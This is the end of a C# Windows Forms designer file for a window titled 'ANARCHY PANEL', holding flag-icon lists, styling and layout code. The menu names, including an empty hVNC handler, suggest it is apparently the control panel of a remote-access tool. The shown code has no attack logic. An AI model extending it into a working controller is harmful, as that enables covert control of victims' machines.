            this.imgFlags.Images.SetKeyName(20, "bf.png");
            this.imgFlags.Images.SetKeyName(21, "bg.png");
            this.imgFlags.Images.SetKeyName(22, "bh.png");
            this.imgFlags.Images.SetKeyName(23, "bi.png");
            this.imgFlags.Images.SetKeyName(24, "bj.png");
            this.imgFlags.Images.SetKeyName(25, "bm.png");
            this.imgFlags.Images.SetKeyName(26, "bn.png");
            this.imgFlags.Images.SetKeyName(27, "bo.png");
            this.imgFlags.Images.SetKeyName(28, "br.png");
            this.imgFlags.Images.SetKeyName(29, "bs.png");
            this.imgFlags.Images.SetKeyName(30, "bt.png");
            this.imgFlags.Images.SetKeyName(31, "bv.png");
            this.imgFlags.Images.SetKeyName(32, "bw.png");
            this.imgFlags.Images.SetKeyName(33, "by.png");
            this.imgFlags.Images.SetKeyName(34, "bz.png");
            this.imgFlags.Images.SetKeyName(35, "ca.png");
            this.imgFlags.Images.SetKeyName(36, "catalonia.png");
            this.imgFlags.Images.SetKeyName(37, "cc.png");
            this.imgFlags.Images.SetKeyName(38, "cd.png");
            this.imgFlags.Images.SetKeyName(39, "cf.png");
            this.imgFlags.Images.SetKeyName(40, "cg.png");
            this.imgFlags.Images.SetKeyName(41, "ch.png");
            this.imgFlags.Images.SetKeyName(42, "ci.png");
            this.imgFlags.Images.SetKeyName(43, "ck.png");
            this.imgFlags.Images.SetKeyName(44, "cl.png");
            this.imgFlags.Images.SetKeyName(45, "cm.png");
            this.imgFlags.Images.SetKeyName(46, "cn.png");
            this.imgFlags.Images.SetKeyName(47, "co.png");
            this.imgFlags.Images.SetKeyName(48, "cr.png");
            this.imgFlags.Images.SetKeyName(49, "cs.png");
            this.imgFlags.Images.SetKeyName(50, "cu.png");
            this.imgFlags.Images.SetKeyName(51, "cv.png");
            this.imgFlags.Images.SetKeyName(52, "cx.png");
            this.imgFlags.Images.SetKeyName(53, "cy.png");
            this.imgFlags.Images.SetKeyName(54, "cz.png");
            this.imgFlags.Images.SetKeyName(55, "de.png");
            this.imgFlags.Images.SetKeyName(56, "dj.png");
            this.imgFlags.Images.SetKeyName(57, "dk.png");
            this.imgFlags.Images.SetKeyName(58, "dm.png");
            this.imgFlags.Images.SetKeyName(59, "do.png");
            this.imgFlags.Images.SetKeyName(60, "dz.png");
            this.imgFlags.Images.SetKeyName(61, "ec.png");
            this.imgFlags.Images.SetKeyName(62, "ee.png");
            this.imgFlags.Images.SetKeyName(63, "eg.png");
            this.imgFlags.Images.SetKeyName(64, "eh.png");
            this.imgFlags.Images.SetKeyName(65, "england.png");
            this.imgFlags.Images.SetKeyName(66, "er.png");
            this.imgFlags.Images.SetKeyName(67, "es.png");
            this.imgFlags.Images.SetKeyName(68, "et.png");
            this.imgFlags.Images.SetKeyName(69, "europeanunion.png");
            this.imgFlags.Images.SetKeyName(70, "fam.png");
            this.imgFlags.Images.SetKeyName(71, "fi.png");
            this.imgFlags.Images.SetKeyName(72, "fj.png");
            this.imgFlags.Images.SetKeyName(73, "fk.png");
            this.imgFlags.Images.SetKeyName(74, "fm.png");
            this.imgFlags.Images.SetKeyName(75, "fo.png");
            this.imgFlags.Images.SetKeyName(76, "fr.png");
            this.imgFlags.Images.SetKeyName(77, "ga.png");
            this.imgFlags.Images.SetKeyName(78, "gb.png");
            this.imgFlags.Images.SetKeyName(79, "gd.png");
            this.imgFlags.Images.SetKeyName(80, "ge.png");
            this.imgFlags.Images.SetKeyName(81, "gf.png");
            this.imgFlags.Images.SetKeyName(82, "gh.png");
            this.imgFlags.Images.SetKeyName(83, "gi.png");
            this.imgFlags.Images.SetKeyName(84, "gl.png");
            this.imgFlags.Images.SetKeyName(85, "gm.png");
            this.imgFlags.Images.SetKeyName(86, "gn.png");
            this.imgFlags.Images.SetKeyName(87, "gp.png");
            this.imgFlags.Images.SetKeyName(88, "gq.png");
            this.imgFlags.Images.SetKeyName(89, "gr.png");
            this.imgFlags.Images.SetKeyName(90, "gs.png");
            this.imgFlags.Images.SetKeyName(91, "gt.png");
            this.imgFlags.Images.SetKeyName(92, "gu.png");
            this.imgFlags.Images.SetKeyName(93, "gw.png");
            this.imgFlags.Images.SetKeyName(94, "gy.png");
            this.imgFlags.Images.SetKeyName(95, "hk.png");
            this.imgFlags.Images.SetKeyName(96, "hm.png");
            this.imgFlags.Images.SetKeyName(97, "hn.png");
            this.imgFlags.Images.SetKeyName(98, "hr.png");
            this.imgFlags.Images.SetKeyName(99, "ht.png");
            this.imgFlags.Images.SetKeyName(100, "hu.png");
            this.imgFlags.Images.SetKeyName(101, "id.png");
            this.imgFlags.Images.SetKeyName(102, "ie.png");
            this.imgFlags.Images.SetKeyName(103, "il.png");
            this.imgFlags.Images.SetKeyName(104, "in.png");
            this.imgFlags.Images.SetKeyName(105, "io.png");
            this.imgFlags.Images.SetKeyName(106, "iq.png");
            this.imgFlags.Images.SetKeyName(107, "ir.png");
            this.imgFlags.Images.SetKeyName(108, "is.png");
            this.imgFlags.Images.SetKeyName(109, "it.png");
            this.imgFlags.Images.SetKeyName(110, "jm.png");
            this.imgFlags.Images.SetKeyName(111, "jo.png");
            this.imgFlags.Images.SetKeyName(112, "jp.png");
            this.imgFlags.Images.SetKeyName(113, "ke.png");
            this.imgFlags.Images.SetKeyName(114, "kg.png");
            this.imgFlags.Images.SetKeyName(115, "kh.png");
            this.imgFlags.Images.SetKeyName(116, "ki.png");
            this.imgFlags.Images.SetKeyName(117, "km.png");
            this.imgFlags.Images.SetKeyName(118, "kn.png");
            this.imgFlags.Images.SetKeyName(119, "kp.png");
            this.imgFlags.Images.SetKeyName(120, "kr.png");
            this.imgFlags.Images.SetKeyName(121, "kw.png");
            this.imgFlags.Images.SetKeyName(122, "ky.png");
            this.imgFlags.Images.SetKeyName(123, "kz.png");
            this.imgFlags.Images.SetKeyName(124, "la.png");
            this.imgFlags.Images.SetKeyName(125, "lb.png");
            this.imgFlags.Images.SetKeyName(126, "lc.png");
            this.imgFlags.Images.SetKeyName(127, "li.png");
            this.imgFlags.Images.SetKeyName(128, "lk.png");
            this.imgFlags.Images.SetKeyName(129, "lr.png");
            this.imgFlags.Images.SetKeyName(130, "ls.png");
            this.imgFlags.Images.SetKeyName(131, "lt.png");
            this.imgFlags.Images.SetKeyName(132, "lu.png");
            this.imgFlags.Images.SetKeyName(133, "lv.png");
            this.imgFlags.Images.SetKeyName(134, "ly.png");
            this.imgFlags.Images.SetKeyName(135, "ma.png");
            this.imgFlags.Images.SetKeyName(136, "mc.png");
            this.imgFlags.Images.SetKeyName(137, "md.png");
            this.imgFlags.Images.SetKeyName(138, "me.png");
            this.imgFlags.Images.SetKeyName(139, "mg.png");
            this.imgFlags.Images.SetKeyName(140, "mh.png");
            this.imgFlags.Images.SetKeyName(141, "mk.png");
            this.imgFlags.Images.SetKeyName(142, "ml.png");
            this.imgFlags.Images.SetKeyName(143, "mm.png");
            this.imgFlags.Images.SetKeyName(144, "mn.png");
            this.imgFlags.Images.SetKeyName(145, "mo.png");
            this.imgFlags.Images.SetKeyName(146, "mp.png");
            this.imgFlags.Images.SetKeyName(147, "mq.png");
            this.imgFlags.Images.SetKeyName(148, "mr.png");
            this.imgFlags.Images.SetKeyName(149, "ms.png");
            this.imgFlags.Images.SetKeyName(150, "mt.png");
            this.imgFlags.Images.SetKeyName(151, "mu.png");
            this.imgFlags.Images.SetKeyName(152, "mv.png");
            this.imgFlags.Images.SetKeyName(153, "mw.png");
            this.imgFlags.Images.SetKeyName(154, "mx.png");
            this.imgFlags.Images.SetKeyName(155, "my.png");
            this.imgFlags.Images.SetKeyName(156, "mz.png");
            this.imgFlags.Images.SetKeyName(157, "na.png");
            this.imgFlags.Images.SetKeyName(158, "nc.png");
            this.imgFlags.Images.SetKeyName(159, "ne.png");
            this.imgFlags.Images.SetKeyName(160, "nf.png");
            this.imgFlags.Images.SetKeyName(161, "ng.png");
            this.imgFlags.Images.SetKeyName(162, "ni.png");
            this.imgFlags.Images.SetKeyName(163, "nl.png");
            this.imgFlags.Images.SetKeyName(164, "no.png");
            this.imgFlags.Images.SetKeyName(165, "np.png");
            this.imgFlags.Images.SetKeyName(166, "nr.png");
            this.imgFlags.Images.SetKeyName(167, "nu.png");
            this.imgFlags.Images.SetKeyName(168, "nz.png");
            this.imgFlags.Images.SetKeyName(169, "om.png");
            this.imgFlags.Images.SetKeyName(170, "pa.png");
            this.imgFlags.Images.SetKeyName(171, "pe.png");
            this.imgFlags.Images.SetKeyName(172, "pf.png");
            this.imgFlags.Images.SetKeyName(173, "pg.png");
            this.imgFlags.Images.SetKeyName(174, "ph.png");
            this.imgFlags.Images.SetKeyName(175, "pk.png");
            this.imgFlags.Images.SetKeyName(176, "pl.png");
            this.imgFlags.Images.SetKeyName(177, "pm.png");
            this.imgFlags.Images.SetKeyName(178, "pn.png");
            this.imgFlags.Images.SetKeyName(179, "pr.png");
            this.imgFlags.Images.SetKeyName(180, "ps.png");
            this.imgFlags.Images.SetKeyName(181, "pt.png");
            this.imgFlags.Images.SetKeyName(182, "pw.png");
            this.imgFlags.Images.SetKeyName(183, "py.png");
            this.imgFlags.Images.SetKeyName(184, "qa.png");
            this.imgFlags.Images.SetKeyName(185, "re.png");
            this.imgFlags.Images.SetKeyName(186, "ro.png");
            this.imgFlags.Images.SetKeyName(187, "rs.png");
            this.imgFlags.Images.SetKeyName(188, "ru.png");
            this.imgFlags.Images.SetKeyName(189, "rw.png");
            this.imgFlags.Images.SetKeyName(190, "sa.png");
            this.imgFlags.Images.SetKeyName(191, "sb.png");
            this.imgFlags.Images.SetKeyName(192, "sc.png");
            this.imgFlags.Images.SetKeyName(193, "scotland.png");
            this.imgFlags.Images.SetKeyName(194, "sd.png");
            this.imgFlags.Images.SetKeyName(195, "se.png");
            this.imgFlags.Images.SetKeyName(196, "sg.png");
            this.imgFlags.Images.SetKeyName(197, "sh.png");
            this.imgFlags.Images.SetKeyName(198, "si.png");
            this.imgFlags.Images.SetKeyName(199, "sj.png");
            this.imgFlags.Images.SetKeyName(200, "sk.png");
            this.imgFlags.Images.SetKeyName(201, "sl.png");
            this.imgFlags.Images.SetKeyName(202, "sm.png");
            this.imgFlags.Images.SetKeyName(203, "sn.png");
            this.imgFlags.Images.SetKeyName(204, "so.png");
            this.imgFlags.Images.SetKeyName(205, "sr.png");
            this.imgFlags.Images.SetKeyName(206, "st.png");
            this.imgFlags.Images.SetKeyName(207, "sv.png");
            this.imgFlags.Images.SetKeyName(208, "sy.png");
            this.imgFlags.Images.SetKeyName(209, "sz.png");
            this.imgFlags.Images.SetKeyName(210, "tc.png");
            this.imgFlags.Images.SetKeyName(211, "td.png");
            this.imgFlags.Images.SetKeyName(212, "tf.png");
            this.imgFlags.Images.SetKeyName(213, "tg.png");
            this.imgFlags.Images.SetKeyName(214, "th.png");
            this.imgFlags.Images.SetKeyName(215, "tj.png");
            this.imgFlags.Images.SetKeyName(216, "tk.png");
            this.imgFlags.Images.SetKeyName(217, "tl.png");
            this.imgFlags.Images.SetKeyName(218, "tm.png");
            this.imgFlags.Images.SetKeyName(219, "tn.png");
            this.imgFlags.Images.SetKeyName(220, "to.png");
            this.imgFlags.Images.SetKeyName(221, "tr.png");
            this.imgFlags.Images.SetKeyName(222, "tt.png");
            this.imgFlags.Images.SetKeyName(223, "tv.png");
            this.imgFlags.Images.SetKeyName(224, "tw.png");
            this.imgFlags.Images.SetKeyName(225, "tz.png");
            this.imgFlags.Images.SetKeyName(226, "ua.png");
            this.imgFlags.Images.SetKeyName(227, "ug.png");
            this.imgFlags.Images.SetKeyName(228, "um.png");
            this.imgFlags.Images.SetKeyName(229, "us.png");
            this.imgFlags.Images.SetKeyName(230, "uy.png");
            this.imgFlags.Images.SetKeyName(231, "uz.png");
            this.imgFlags.Images.SetKeyName(232, "va.png");
            this.imgFlags.Images.SetKeyName(233, "vc.png");
            this.imgFlags.Images.SetKeyName(234, "ve.png");
            this.imgFlags.Images.SetKeyName(235, "vg.png");
            this.imgFlags.Images.SetKeyName(236, "vi.png");
            this.imgFlags.Images.SetKeyName(237, "vn.png");
            this.imgFlags.Images.SetKeyName(238, "vu.png");
            this.imgFlags.Images.SetKeyName(239, "wales.png");
            this.imgFlags.Images.SetKeyName(240, "wf.png");
            this.imgFlags.Images.SetKeyName(241, "ws.png");
            this.imgFlags.Images.SetKeyName(242, "ye.png");
            this.imgFlags.Images.SetKeyName(243, "yt.png");
            this.imgFlags.Images.SetKeyName(244, "za.png");
            this.imgFlags.Images.SetKeyName(245, "zm.png");
            this.imgFlags.Images.SetKeyName(246, "zw.png");
            this.imgFlags.Images.SetKeyName(247, "xy.png");
            // 
            // cLEARToolStripMenuItem
            // 
            this.cLEARToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("cLEARToolStripMenuItem.Image")));
            this.cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
            this.cLEARToolStripMenuItem.Size = new System.Drawing.Size(101, 22);
            this.cLEARToolStripMenuItem.Text = "Clear";
            this.cLEARToolStripMenuItem.Click += new System.EventHandler(this.CLEARToolStripMenuItem_Click);
            // 
            // guna2Elipse1
            // 
            this.guna2Elipse1.BorderRadius = 9;
            this.guna2Elipse1.TargetControl = this;
            // 
            // guna2Elipse2
            // 
            this.guna2Elipse2.BorderRadius = 9;
            this.guna2Elipse2.TargetControl = this.guna2TabControl1;
            // 
            // imageList1
            // 
            this.imageList1.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit;
            this.imageList1.ImageSize = new System.Drawing.Size(16, 11);
            this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
            // 
            // guna2Elipse3
            // 
            this.guna2Elipse3.BorderRadius = 9;
            this.guna2Elipse3.TargetControl = this.listView1;
            // 
            // guna2Elipse5
            // 
            this.guna2Elipse5.BorderRadius = 9;
            this.guna2Elipse5.TargetControl = this.guna2TabControl2;
            // 
            // Form1
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Inherit;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.ClientSize = new System.Drawing.Size(947, 460);
            this.Controls.Add(this.guna2Panel3);
            this.Controls.Add(this.listView3);
            this.Controls.Add(this.listView1);
            this.Controls.Add(this.guna2Panel2);
            this.Controls.Add(this.guna2Panel1);
            this.Controls.Add(this.tabControl1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "ANARCHY PANEL";
            this.Activated += new System.EventHandler(this.Form1_Activated);
            this.Deactivate += new System.EventHandler(this.Form1_Deactivate);
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter2)).EndInit();
            this.tabControl1.ResumeLayout(false);
            this.guna2ContextMenuStrip2.ResumeLayout(false);
            this.guna2Panel1.ResumeLayout(false);
            this.guna2Panel2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).EndInit();
            this.contextMenuStrip.ResumeLayout(false);
            this.guna2Panel3.ResumeLayout(false);
            this.guna2Panel3.PerformLayout();
            this.Pnlinfo.ResumeLayout(false);
            this.guna2Panel4.ResumeLayout(false);
            this.guna2TabControl2.ResumeLayout(false);
            this.tabPage5.ResumeLayout(false);
            this.tabPage5.PerformLayout();
            this.guna2TabControl1.ResumeLayout(false);
            this.Tasks.ResumeLayout(false);
            this.contextMenuLogs.ResumeLayout(false);
            this.Desktops.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.guna2GradientPanel4.ResumeLayout(false);
            this.guna2GradientPanel4.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).EndInit();
            this.Guna2GradientPanel3.ResumeLayout(false);
            this.Guna2GradientPanel3.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox9)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).EndInit();
            this.Guna2GradientPanel1.ResumeLayout(false);
            this.Guna2GradientPanel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox11)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox12)).EndInit();
            this.Guna2GradientPanel2.ResumeLayout(false);
            this.Guna2GradientPanel2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox10)).EndInit();
            this.contextMenuThumbnail.ResumeLayout(false);
            this.ResumeLayout(false);

    }

    private void hVNCToolStripMenuItem_Click(object sender, EventArgs e)
    {

    }
}